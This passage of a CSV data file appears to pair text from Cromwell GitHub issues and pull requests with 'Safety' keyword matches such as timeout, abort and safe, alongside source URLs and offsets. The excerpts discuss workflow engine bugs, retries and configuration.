Safety,Metadata entry count safety limit should apply to matched rows only [BA-6484],MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5584:21,safe,safety,21,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5584,1,['safe'],['safety']
Safety,Metadata entry count safety limit should apply to matched rows only [BA-6484]. [BA-6484]: https://broadworkbench.atlassian.net/browse/BA-6484,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5725:21,safe,safety,21,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5725,1,['safe'],['safety']
Safety,"MetadataValue.apply was throwing an NPE exception when passed null, even though it had a call to .getOrElse("""").; Consolidated standard backend runtimeAttributeDefinitions implementation.; Added a GoogleAuthModeSpec.assumeHasApplicationDefaultCredentials in tests that use application default credentials.; Refactored away JesBackendLifecycleActorFactory's toJes, only used in one place where a similar standard method now exists.; Refactored away JesBackendLifecycleActorFactory's staticRuntimeAttributeDefinitions, only used in specs.; CromwellServer no longer hard codes the binding timeout.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1823:586,timeout,timeout,586,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1823,1,['timeout'],['timeout']
Safety,Methods to Improve handling of GCP backend timeouts,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7551:43,timeout,timeouts,43,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7551,1,['timeout'],['timeouts']
Safety,Modified the reference docker submit command to avoid bash redirection,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1734:48,avoid,avoid,48,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1734,1,['avoid'],['avoid']
Safety,Modified the reference docker submit command to avoid bash redirection. Closes #1556,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1562:48,avoid,avoid,48,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1562,1,['avoid'],['avoid']
Safety,"Modify the `script-epilogue` to remove the sync operation. I also encountered the sync problem, and removing sync has not caused any identifiable issues. Cromwell will not start dependent jobs until the rc file is written to disk by the job and polled Cromwell, so I suspect this is safe. . See:; https://gatkforums.broadinstitute.org/wdl/discussion/9368/how-difficult-would-it-be-to-get-cromwell-working-on-slurm",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4347#issuecomment-435468022:283,safe,safe,283,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4347#issuecomment-435468022,1,['safe'],['safe']
Safety,"More info:; - Again `WdlFile` is allowing a directory to slip in, while this isn't technically supported. For another example see #1935, and others I cannot locate at the moment.; - With an input file of `""""`, this directory equates to the present working directory.; - Cromwell is attempting to localize the whole directory.; - hard-link to a directory always fails, and since this is docker, soft-link isn't available.; - Cromwell is then copying everything in the pwd. Note, this includes everything under `cromwell-executions`, so it could be potentially large.; - Issuing a Control-C at this point doesn't interrupt the copy localization. I'm not sure how we'll implement aborting copying.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1954#issuecomment-282575488:677,abort,aborting,677,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1954#issuecomment-282575488,1,['abort'],['aborting']
Safety,"More people are using the JG server to launch multiple workflows w/ jobs on the order of 10k and it's being slow to start those jobs. There's definitely something going on w/ memory still but one explanation is also that jobs are being queued and throttled in Cromwell to respect quota for submission which is good, but if we have tens of thousands it might take some time to start them. Jose submitted a 40k jobs workflow and aborted it almost immediately and it got me thinking that *if* they were in that queue they would still be submitted.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2750#issuecomment-336873648:427,abort,aborted,427,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2750#issuecomment-336873648,1,['abort'],['aborted']
Safety,"Most of the genomic file types we work with in the variant discovery pipelines are typically accompanied by an index file with a conventionally predictable name (eg my_callset.vcf comes with my_callset.vcf.idx). Right now, as a WDL author, I have to supply these index files explicitly in my inputs json files and in several places in my workflows. This is very tedious, so it would be glorious to have Cromwell just automatically recognize when file inputs and outputs are one of a defined index-associated types, search for the corresponding indices based on given naming conventions, and implicitly co-localize the index files that it finds (but not fail if it doesn't find them, because sometimes we work without indices!).",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1412:144,predict,predictable,144,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1412,1,['predict'],['predictable']
Safety,"Most of these issues are complete so I am going to add the remaining one, #637, to the [Abort Spec](https://docs.google.com/document/d/1B0FElJXOp4IP-v24C62CLsC0JQMbQPjaIrjOwnDqko8/edit).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1625#issuecomment-325468218:88,Abort,Abort,88,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1625#issuecomment-325468218,1,['Abort'],['Abort']
Safety,"My ""test"" right now is the following code in a Scala worksheet:; ```; import scala.concurrent.{ExecutionContext, Future}. implicit val ec = ExecutionContext.global. val x = Future(throw new Exception(""hello world"")). val y = x.map(_ => println(""wasd""))(ec); .recover { case a: Throwable => println(""Exception was: "" + a.getMessage) }(ec); ```; which prints; ```; Exception was: hello world; ```; I'm working on figuring out how construct this in situ in a way that meaningfully tests something.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5022#issuecomment-501411862:259,recover,recover,259,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5022#issuecomment-501411862,1,['recover'],['recover']
Safety,"My WDL pipeline failed to run with Cromwell 55 configured with the `cromwell.backend.google.pipelines.v2beta.PipelinesApiLifecycleActorFactory` Google API with a long list of errors such as the following:; ```; ...; {; ""causedBy"": [; {; ""causedBy"": [; {; ""message"": ""504 Gateway Timeout\nGET https://storage.googleapis.com/download/storage/v1/b/mccarroll-mocha/o/cromwell%2Fcromwell-executions%2Fmocha%2F86d47e9a-5745-4ec0-b4eb-0164f073e5f4%2Fcall-idat2gtc%2Fshard-73%2Frc?alt=media"",; ""causedBy"": []; }; ],; ""message"": ""Could not read from gs://mccarroll-mocha/cromwell/cromwell-executions/mocha/86d47e9a-5745-4ec0-b4eb-0164f073e5f4/call-idat2gtc/shard-73/rc: 504 Gateway Timeout\nGET https://storage.googleapis.com/download/storage/v1/b/mccarroll-mocha/o/cromwell%2Fcromwell-executions%2Fmocha%2F86d47e9a-5745-4ec0-b4eb-0164f073e5f4%2Fcall-idat2gtc%2Fshard-73%2Frc?alt=media""; }; ],; ""message"": ""[Attempted 1 time(s)] - IOException: Could not read from gs://mccarroll-mocha/cromwell/cromwell-executions/mocha/86d47e9a-5745-4ec0-b4eb-0164f073e5f4/call-idat2gtc/shard-73/rc: 504 Gateway Timeout\nGET https://storage.googleapis.com/download/storage/v1/b/mccarroll-mocha/o/cromwell%2Fcromwell-executions%2Fmocha%2F86d47e9a-5745-4ec0-b4eb-0164f073e5f4%2Fcall-idat2gtc%2Fshard-73%2Frc?alt=media""; }; ],; ""message"": ""Workflow failed""; ```; I was under the expectation that this had been handled in issue #5344 and that Cromwell would retry to access the files until available (the files do indeed exist at the time of this writing).",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6154:279,Timeout,Timeout,279,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6154,3,['Timeout'],['Timeout']
Safety,"My jobs aren't starting because there's a giant queue of jobs that have been cancelled, but are waiting to start before they can be aborted. This shouldn't happen. If a job is aborted before it can be launched it shouldn't take a long time to process it. . I heard this might be fixed in 30 already, but if it's not, it would be great to have it fixed.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2966:132,abort,aborted,132,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2966,2,['abort'],['aborted']
Safety,NB you can also use `[force ci]` in a commit message to avoid having to create multiple PRs just to see tests run,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6177#issuecomment-775277475:56,avoid,avoid,56,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6177#issuecomment-775277475,1,['avoid'],['avoid']
Safety,"NFS , cromwell and IO timeouts.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3648:22,timeout,timeouts,22,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3648,1,['timeout'],['timeouts']
Safety,"Never merge this.; Need sanity checking. Testing method which I used was to run HelloWorld workflow using Cromwell built from this branch and wait for successful Carboniting (or OOM, or Cromwell starting to crumble in other ways).; Modifications made in this branch force Cromwell to copy the given number of root workflow's metadata jsons into the resulted carbonited json as if they were subworkflows.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5525:24,sanity check,sanity checking,24,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5525,1,['sanity check'],['sanity checking']
Safety,"Nevermind, just noticed some failures due to Docker rate-limiting, which I would love to completely avoid. I'm going to try installing Vault directly rather than using Docker.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6669#issuecomment-1031903603:100,avoid,avoid,100,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6669#issuecomment-1031903603,1,['avoid'],['avoid']
Safety,"Nice and terse, though unfortunately not terse enough to avoid the dreaded rebase.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/47#issuecomment-112246577:57,avoid,avoid,57,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/47#issuecomment-112246577,1,['avoid'],['avoid']
Safety,"Nice, OK, so the test is `should abort a workflow mid run abort.scheduled_abort` and the failure is `expected: ""Aborted"" but got: ""Failed""`. So it seems like `true` makes an actual abort happen as expected, as opposed to an abort that somehow looks like a failure.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2111156466:33,abort,abort,33,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2111156466,5,"['Abort', 'abort']","['Aborted', 'abort']"
Safety,No more unsafe `List.head` in SWRA. Closes #1615,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1616:8,unsafe,unsafe,8,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1616,1,['unsafe'],['unsafe']
Safety,"No regressions tests in the PR, but the following cases were tested manually:. - A bad key, never becoming good: failed after 5 minutes; - A bad key, becoming good after 1 minute: the workflow picked up and succeeded; - A bad key, followed by an abort after 1 minute: the workflow aborted successfully",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6983:246,abort,abort,246,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6983,2,['abort'],"['abort', 'aborted']"
Safety,No timeout on rc file,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4050:3,timeout,timeout,3,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4050,1,['timeout'],['timeout']
Safety,"No worries, that's what PRs are for. 😉 . Regarding the text:. > Fixed a bug that could cause workflows to unexpectedly fail with errors related to Google Cloud Storage. The errors reference GcsBatchFlow.BatchFailedException and Read timed out or 413 Request Entity Too Large. This PR doesn't address the _initial_ read timeouts. But it does mitigate them piling up to create bigger batches that might cause more timeouts. What I'm not sure of is with this change of a new-batch-per-request will the ""Attempted 10 times"" be able to weather whatever is causing the timeout hiccups or not. I don't want to overpromise in the message, so maybe something like?. > Better handling for a bug that could cause workflows to unexpectedly fail with errors related to Google Cloud Storage. The errors reference GcsBatchFlow.BatchFailedException and Read timed out or 413 Request Entity Too Large.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6218#issuecomment-800636991:319,timeout,timeouts,319,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6218#issuecomment-800636991,3,['timeout'],"['timeout', 'timeouts']"
Safety,Not 100% sure there's a locking issue in this case as there should be only one Cromwell processing the append-only abort request and at most one Cromwell running an abortable workflow?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3344#issuecomment-370523886:115,abort,abort,115,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3344#issuecomment-370523886,2,['abort'],"['abort', 'abortable']"
Safety,"Not 100% sure what wasn't working at what point. I suspect that based on the order of the original commits<sup>1</sup>, the `RunMysql` and server should have both worked at ""4."". At that point I believe the config `url` still contained `useSSL=true`, the application config was being passed on the command line, and the mysql jdbc code should have been in the main assembly. By the time I was running ""11."" earlier today, the configuration `url` no longer contained `useSSL=true`, and connections within `SlickDataAccess` were returning the error combo:. ```; java.sql.SQLTimeoutException: Timeout after 1000ms of waiting for a connection.; ...; Caused by: java.sql.SQLException: Access denied for user '…'@'…' (using password: YES); ```. I did add another variable in ""11."" by always testing with `useSSL=true&requireSSL=true`, but according to the [logs](http://pastebin/209) of the latest 'RunMysql', `jdbcMain` and `jdbcRequireSsl` passed. So that _shouldn't_ have changed the results. Meanwhile, all test combinations of setting ssl worked for both slick and raw datasource connections, in tests via the url (*Ssl*), or via the dataSource properties (*Prop). So I think just setting back the `useSSL=true` is the minimum required fix, but I'd prefer to see `requiredSSL=true` added as well, as was successfully run in `slickSslDriver`. <sup>1</sup> What I believe is the previous order of the commits:; 1. Updated run.sh to pass in the mysql key & trust stores.; 2. log database config; 3. make mysql not test-only; 4. Add config file option in run.sh to make container use custom configuration; 5. debugging ""script""; 6. log actual uniquified config; 7. Test at JDBC level.; 8. hardcode use of SSL; 9. count rows in WORKFLOW_EXECUTION; 10. Logging the just the URL in SlickDataAccess, not the entire config.; 11. Added a suite of mysql ssl test.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/85#issuecomment-123520815:590,Timeout,Timeout,590,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/85#issuecomment-123520815,1,['Timeout'],['Timeout']
Safety,"Not sure, we can err on the side of safety and do just the group for now.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5527#issuecomment-637798466:36,safe,safety,36,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5527#issuecomment-637798466,1,['safe'],['safety']
Safety,"Note: I labelled this ""paranoia"" because even without the `Try`, the test passed consistently. - Maybe this is already protected against elsewhere; - Maybe the test isn't testing the right thing; - Maybe I just got (un)lucky when I ran it. Either way, it doesn't seem like a *bad* thing to be safe in case `take` throws an exception.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4165#issuecomment-425139204:293,safe,safe,293,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4165#issuecomment-425139204,1,['safe'],['safe']
Safety,Note:; * [x] Resolve rebase on top of test timeouts before merging. Worth checking before merging:. * [x] Travis CI; * [x] Jenkins PAPIv2 CI ([jenkins results](https://gotc-jenkins.dsp-techops.broadinstitute.org/job/cromwell-cron-papiv2-alpha1/776/)),MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5929:43,timeout,timeouts,43,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5929,1,['timeout'],['timeouts']
Safety,"Nothing really clever about this PR, just cashing in on past investments in separation of concerns. 1. Remove SBT projects; - Clean compile time 64s -> 53s on M1; - Dependencies removed, no longer subject to security updates or conflicts (see https://github.com/broadinstitute/cromwell/pull/6948); 2. Remove Centaur integration tests; - Slightly improved Travis build time; - Less stuff to port when we leave Travis; 3. Sever connections between CWL and the rest of Cromwell; - Because of Cromwell's extremely compartmentalized design, only two files really reference CWL directly:; - Entry point for server mode; - Entry point for command-line Womtool; - Only small logic updates needed; 4. Can now safely delete top-level `cwl` directory because nothing depends on it. ---. Reviewer's guide:; - Commits up through [Remove obsolete tests](https://github.com/broadinstitute/cromwell/pull/6955/commits/7a26149d9e70818edf852a16b114809ca9c0dc29) are self-contained and pass CI on their own; - [No longer minimal](https://github.com/broadinstitute/cromwell/pull/6955/commits/557d7b72a97651bcdca8ee27590ebfa29473ad05) removes most of the code; - [Remove *.cwl files](https://github.com/broadinstitute/cromwell/pull/6955/commits/eb4eaef0574ec06a256d38bb222d01ebc44a7e9f) speaks for itself",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6955:700,safe,safely,700,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6955,1,['safe'],['safely']
Safety,"OK to all suggestions except the 405 for attempted aborts on terminal workflows. I've only seen that used for inappropriate HTTP verbs, which Spray should already be checking before it gets to our business logic. FYI there's some interesting work being done by the Rawls team to get the Swagger noise out of the code, although it seems to remain as un-DRY as ever:. https://github.com/broadinstitute/rawls/pull/63/files",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/114#issuecomment-125936775:51,abort,aborts,51,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/114#issuecomment-125936775,1,['abort'],['aborts']
Safety,Objectives. confirm:. - deadlocks are not observed; - work is distributed correctly; - abandoned workflows are recovered; - abort workflow is functional,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4241:111,recover,recovered,111,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4241,2,"['abort', 'recover']","['abort', 'recovered']"
Safety,"Oh nm, it looks like #751 is the Recover ticket. Is this the preemptibility ticket?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/749#issuecomment-217903096:33,Recover,Recover,33,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/749#issuecomment-217903096,1,['Recover'],['Recover']
Safety,"Oh right, I forgot about this comment... sorry :sweat_smile: The issue turned out to be with the call-caching strategy we were using. Because there were a lot of files being created, cromwell needed to do a large amount of hashing, which used up all of the available CPUs eventually leading to the timeouts. We changed the call-caching strategy and are no now longer running into this error.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4057#issuecomment-432255713:298,timeout,timeouts,298,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4057#issuecomment-432255713,1,['timeout'],['timeouts']
Safety,"Okay, I'm having a little bit of trouble keeping track of what JARs are allowed to included where... but I'll avoid hijacking this PR to talk about that.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/688#issuecomment-209591621:110,avoid,avoid,110,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/688#issuecomment-209591621,1,['avoid'],['avoid']
Safety,"Omits the first of the two CCHE migrations which appears to be made unnecessary by the second, hopefully avoiding Götterdämmerung.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5040:105,avoid,avoiding,105,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5040,1,['avoid'],['avoiding']
Safety,"One case for caching the results for a few seconds would be the possibility of just missing the results due to requester timeout, and then when the retry happens having to recalculate the entire thing again. ---. Alternatively (getting into alternative metadata schemes) we do *permanent* caching - ie replacing all those simpletons with the pre-processed metadata response for completed workflows (maybe triggered by a metadata request for the workflow), so that we don't need to continually rebuild them even months after a workflow completes.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4226#issuecomment-429104968:121,timeout,timeout,121,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4226#issuecomment-429104968,2,['timeout'],['timeout']
Safety,"One of Morgan's input files was missing an md5 in its object metadata. Cromwell was dutifully falling back to our backup option, which is to read every byte of the file into memory and calculate the hash itself. This resulted in extraordinary network and CPU usage that destabilized the instance and caused a continual crash/reboot cycle. We think this is also what Lori ran into with the featured workspaces. Now, we detect & avoid this condition, print a warning, and carry on without call caching:; ```; 41183c60:ImputationBeagle.SubsetVcfToRegion:3:1:; Hash error ([Attempted 1 time(s)] - Exception:; File of type BlobPath requires hash in object metadata, not present for; https://lz8b0d07a4d28c13150a1a12.blob.core.windows.net/sc-94fd136b-4231-4e80-ab0c-76d8a2811066/hg38/inputs/palantir_merged_input_samples.liftedover.vcf.gz),; disabling call caching for this job.; ```. Obviously, we'd like to enhance this in the future so that call caching is still possible for these jobs, but we have to walk before we can run. ---. Visualization eye candy section!. Swiftly downloading a file on the datacenter multi-gigabit LAN:. ![Screenshot 2024-05-02 at 19 24 04](https://github.com/broadinstitute/cromwell/assets/1087943/46484bbd-30e0-4f88-8f6c-05b50649c557). Telltale CPU curve as we chew through one file after another:. ![Screenshot 2024-05-03 at 11 32 13](https://github.com/broadinstitute/cromwell/assets/1087943/7916ce63-8d4c-46f7-a86a-b3313edf0d77). Flame graph showing the smoking gun, `generateMd5FileHashForPath`:. ![Screenshot 2024-05-02 at 14 02 25](https://github.com/broadinstitute/cromwell/assets/1087943/0d06f3ad-8155-4b43-bef7-6d9ccce35132)",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7419:418,detect,detect,418,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7419,2,"['avoid', 'detect']","['avoid', 'detect']"
Safety,"One possible solution: We should probably create a trait which loads all the configuration (once per application), and let classes mix it in to avoid doing ConfigFactory.load() at multiple places",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/796:144,avoid,avoid,144,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/796,1,['avoid'],['avoid']
Safety,Only execute isAlive once per timeout,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4220:30,timeout,timeout,30,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4220,1,['timeout'],['timeout']
Safety,"Order of events:. Start with #3344 and #3342 as those are the requirements for having multiple writer-Cromwell nodes share a database. Next, start #4239 to re-create a deadlocking issue, and address it with a solution:; #4249; #4240 . Generate test cases to make sure Cromwell is able to recover appropriately in case of shutdown:; #4242 ; And test cases to ensure that Cromwell is running/aborting workflows as expected across multiple nodes:; #4241",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4369:288,recover,recover,288,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4369,2,"['abort', 'recover']","['aborting', 'recover']"
Safety,"Order of events:. Start with #3344 and #3342 as those are the requirements for having multiple writer-Cromwell nodes to safely share a database. Next, start #4239 de-serialize workflow heartbeats, and build a test case #4414 to re-create the deadlocking issue we've seen before in production. Follow up that work with a solution that addresses the deadlock. Below are two ideas brainstormed in the past:; #4249; #4240. Generate test cases to make sure Cromwell is able to recover appropriately in case of shutdown:; #4242. And test cases to ensure that Cromwell is running/aborting workflows as expected across multiple nodes:; #4241 . GDoc of plan as of March '19; https://docs.google.com/document/d/10AGE3foZsKOHlgUpq3BE4mkUYphcjYyxMt0miQz4FGk/edit?usp=sharing",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4370:120,safe,safely,120,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4370,3,"['abort', 'recover', 'safe']","['aborting', 'recover', 'safely']"
Safety,"Overall I'm liking the `Validation` angle to these changes, this seems like a nice system which could be used in other spots in Cromwell. I think the attribute parsing could be made more tolerant so that Kristian's examples of `8G` and `8GB` actually would parse, but that's orthogonal to getting helpful error messages when something is unparseable. I'm happy to address more tolerant parsing in a separate PR. Also, it feels like the case classes might have been overused in these changes; they aren't replacing type aliases but are wrapping what used to be raw types. This does buy some added type safety in . ``` scala; (failOnStderr |@| cpu |@| preemptible |@| disks |@| memory){ RuntimeAttributes(docker, zones, _, _, _, _, _) }; ```. But then everywhere else there's noise for boxing and unboxing the raw types to and from these case classes.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/163#issuecomment-135972385:601,safe,safety,601,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/163#issuecomment-135972385,1,['safe'],['safety']
Safety,"P2 - to optimize the case of restarting a single cromwell, upon shutdown the heartbeat related information (server, timestamp) should be deleted so the workflow is immediately picked up on restart rather than after the timeout period",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4242:219,timeout,timeout,219,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4242,1,['timeout'],['timeout']
Safety,"PAPI error code 2. Execution failed: pulling image: docker login: generic::unknown: retry budget exhausted (10 attempts): running docker login: exit status 1 (standard error: ""WARNING! Using --password via the CLI is insecure. Use --password-stdin.\nError response from daemon: Get https://registry-1.docker.io/v2/: net/http: request canceled while waiting for connection (Client.Timeout exceeded while awaiting headers). Seen [here](https://gotc-jenkins.dsp-techops.broadinstitute.org/job/cromwell-cron-papiv2/170)",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4438:380,Timeout,Timeout,380,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4438,1,['Timeout'],['Timeout']
Safety,PAPI requests don't get removed from queue when aborted,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2750:48,abort,aborted,48,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2750,1,['abort'],['aborted']
Safety,"PR 1 of 3:; 1. Remove cromwell-core dependency from cloud-support; 2. Run jes centaur on travis; 3. Generate coverage for integration tests. ---. Instead of credentials requiring WorkflowOptions, any String => String will do, including Map[String, String].; Retrieving credentials only requires actorSystem/executionContext when retrying.; Moved logback dependencies from common library over to testing.; Added mockito to all artifact tests.; Fixed akka-stream-testkit dependency appearing in core's main instead of test.; Split confusingly named baseDependencies into configDependencies ++ catsDependencies.; Other dependency cleanup to reduce duplicates and extra transitive dependencies.; Log stderr from centaur'ed cromwell failures.; The total attempt time to connect to cromwell for a test is now longer than the timeout of a cromwell restart.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2938:819,timeout,timeout,819,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2938,1,['timeout'],['timeout']
Safety,"PR redo. This on moves the docs to google and increses sbt jvm stack size to avoid ""(cwl / Compile / compileIncremental) java.lang.StackOverflowError"".",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3720#issuecomment-394412402:77,avoid,avoid,77,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3720#issuecomment-394412402,1,['avoid'],['avoid']
Safety,"Part II of the ""unexpected `JobFailedNonRetryable` during cache output copying"" saga. - Stop using the confusing `JobFailedNonRetryable` response when an output copy fails (it's not like `JobSucceeded` which correctly tells us that the job has already succeeded); - Update the tests to reflect this; - Add some sanity checks to the EJEA's handlers (specifically - did we copy the right outputs, and did we fetch the right outputs from the database)",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4091:311,sanity check,sanity checks,311,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4091,1,['sanity check'],['sanity checks']
Safety,"Path+modtime should guarantee that files are the same. . I have expanded the SFS test scala file so it properly tests the new `cached-inputs` strategy. I have added information on how to use the strategy in the docs, and added this PR to the changelog. ### Help still needed. There are two things that I could not figure out without cromwell developer help:. ~~* Checking whether a file exists and copying it to the cache should never be done by multiple threads simeltaneously. I have used the `synchronized` method to prevent this. I used an object for this, because I am sure it is unique within the JVM at cromwell runtime. This works fine, but I can imagine this can be solved in a nicer way using akka? However the akka documentation is an extensive jungle on its own, and requires quite some expertise to navigate. I could not find very quickly what I needed, and the `synchronization` primitive works fine. It is also **just 2 lines of extra code**. So if the akka solution is quite elegant as well I would like to learn about that. If not, well, it is not too bad having 2 lines of understandable commented code that is not ""the proper way of doing things(TM)"".~~. * I used the SFS scalatests to make sure everything worked correctly. However this did not test whether the thread safety was working correctly. I have added a test wdl in centaur: `standardTestCases/cached_copy/cached_copy.wdl`. This workflow creates 10 jobs that read the same input file. This workflow will crash if the `cached-inputs` cache is not used in a thread-safe way. I tested this manually with `java 